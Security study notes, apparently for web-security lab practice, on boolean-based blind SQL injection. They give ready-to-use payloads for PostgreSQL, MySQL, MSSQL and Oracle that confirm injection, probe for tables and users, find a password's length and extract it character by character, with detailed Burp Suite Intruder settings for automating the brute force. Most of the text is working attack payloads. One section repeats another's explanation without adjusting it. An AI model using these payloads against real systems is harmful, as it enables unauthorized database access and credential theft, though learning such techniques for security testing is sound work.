
## Conditional Based SQLi

- The below techniques are based on Blind SQLi conditional responses i.e. we need to infer our SQLi payload and customize it based on what the response we get. Like creating **true** or **false** statements. **true** and **false** responses will vary. Like for example :- The server might say **welcome** if the query output is **true** and might not output anything if query output is **false**.

### 1. Checking Parameter Vulnerability

- Lets say the original query is `SELECT item_name FROM Shop WHERE item_name=something`
- Have a basic idea or concept of what the query might be doing and then do the below stuff.
- Check parameter vulnerabilities like cookies or something if any.
- Look for server responses, any change, analyze code or something.

```sql
' AND '1'='1
' AND '1'='2
/*
the above 2 payloads are demo
like check each one and if responses differ you got a SQLi vulnerability
you need to have a basic idea of what the original query is.
*/
```

### 2. Checking Table Presence

- **WORKING**
	- For example a query has a structure like `SELECT item_name FROM Shop WHERE item_name='something'` . Now in this query lets say we want to add our own query to check if a certain table is present or not.
	- Here `'a'` is a random value it can be anything. The idea is that if the particular table exists then `'a'` is given as output otherwise no output. Now sometimes the server might respond in a different way so observe closely.

```sql
-- PostgreSQL
' AND (SELECT 'a' FROM <table_name> LIMIT 1)='a'--

-- MySQL / MariaDB
' AND (SELECT 'a' FROM <table_name> LIMIT 1)='a'#

-- Microsoft SQL Server (MSSQL)
' AND (SELECT TOP 1 'a' FROM <table_name>)='a'--

-- Oracle
' AND (SELECT 'a' FROM <table_name> WHERE ROWNUM=1)='a'--

/*
check the PortSwigger CHEATSHEET for database specific payloads.
*/
```

### 3. Checking User Entry

- **WORKING**
	- For example a query has a structure like `SELECT item_name FROM Shop WHERE item_name='something'` . Now in this query lets say we want to add our own query to check if a certain table is present or not.
	- Here `'a'` is a random value it can be anything. The idea is that if the particular table exists then `'a'` is given as output otherwise no output. Now sometimes the server might respond in a different way so observe closely.

```sql
-- PostgreSQL
' AND (SELECT 'a' FROM <table_name> WHERE <column>='<username>' LIMIT 1)='a'--

-- MySQL / MariaDB
' AND (SELECT 'a' FROM <table_name> WHERE <column>='<username>' LIMIT 1)='a'#

-- Microsoft SQL Server (MSSQL)
' AND (SELECT TOP 1 'a' FROM <table_name> WHERE <column>='<username>')='a'--

-- Oracle
' AND (SELECT 'a' FROM <table_name> WHERE <column>='<username>' AND ROWNUM=1)='a'--

/*
check the PortSwigger CHEATSHEET for database specific payloads.
*/
```

### 4. Finding Password Length

- **WORKING**
	- Increment the  `<value>` by `1` each time until you hit an error. So if at `19` you get error so the password length is 19.

**TIP: Send this request to BurpSuite Intruder and then add payload in the `<value>` part and set Payload Type to Numbers and provide a starting and ending range. Then start the attack. Look for the last error request. The last error request will have the length of the password. So if the last request is `19` so password length = `19 + 1 = 20`.**

```sql
-- PostgreSQL
'+AND+(SELECT+'a'+FROM+<table_name>+WHERE+<username_column>='<username>'+AND+LENGTH(<password_column>)><value>+LIMIT+1)='a'--

-- MySQL / MariaDB
'+AND+(SELECT+'a'+FROM+<table_name>+WHERE+<username_column>='<username>'+AND+LENGTH(<password_column>)><value>+LIMIT+1)='a'#

-- Microsoft SQL Server (MSSQL)
'+AND+(SELECT+TOP+1+'a'+FROM+<table_name>+WHERE+<username_column>='<username>'+AND+LEN(<password_column>)><value>)='a'--

-- Oracle
'+AND+(SELECT+'a'+FROM+<table_name>+WHERE+<username_column>='<username>'+AND+LENGTH(<password_column>)><value>+AND+ROWNUM=1)='a'--

/*
check the PortSwigger CHEATSHEET for database specific payloads.
*/
```

### 5. Bruteforcing Password

- **LOGIC**
	- This attack uses **Blind SQL Injection with BurpSuite Intruder** to extract sensitive data (e.g., password) one character at a time by checking conditions. The base payload structure is `SELECT item_name FROM Shop WHERE item_name='input'`
	- The payload is designed to extract a **single character from the password column** using the `SUBSTR()` function. It compares that character with a guessed value provided via BurpSuite payloads.
- **SETUP**
	- Use BurpSuite **CLUSTER BOMB ATTACK**.
	- **Payload 1 Configuration**
		- `§1§` is the **INDEX VALUE**.
		- `§1§` should contain numbers from 1 to **length of the password**.
		- `Payload Type -> Numbers`, `Start -> 1`, `End -> length of password`, `Step -> 1 `
		- Testing each character from the **payload 2** wordlist against each index of the password value.
		
	- **Payload 2 Configuration**
		- `§2§` is the **WORDLIST CHARACTER**.
		- `§2§` will contain one character each line. 
		- `Payload Type -> Bruteforcer` , `Character Set -> abcdefghijklmnopqrstuvwxyz0123456789`, `Min Length -> 1 Max Length -> 1`
		
	-  **Grep Match Configuration**
		- Go to settings -> Scroll Down.
		- Add `"<string>"`.  The string you are adding should be the string that gets returned in a **true** response by the app so that you can filter the correct password letters fast.
		
- **WORKING**
	- Since this is conditional response based SQLi so for each **true** condition there will a unique response. Look for that unique response in the BurpSuite requests.

```sql
-- PostgreSQL
' AND (SELECT SUBSTRING(<password_column>,§1§,1) FROM <table_name> WHERE <username_column>='<username>' LIMIT 1)='§2§'--

-- MySQL / MariaDB
' AND (SELECT SUBSTRING(<password_column>,§1§,1) FROM <table_name> WHERE <username_column>='<username>' LIMIT 1)='§2§'#

-- Microsoft SQL Server (MSSQL)
' AND (SELECT SUBSTRING(<password_column>,§1§,1) FROM <table_name> WHERE <username_column>='<username>')='§2§'--

-- Oracle
' AND (SELECT SUBSTR(<password_column>,§1§,1) FROM <table_name> WHERE <username_column>='<username>' AND ROWNUM=1)='§2§'--

/*
check the PortSwigger CHEATSHEET for database specific payloads.
*/
```


---
## Examining the Database

[SQLi CHEATSHEET PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)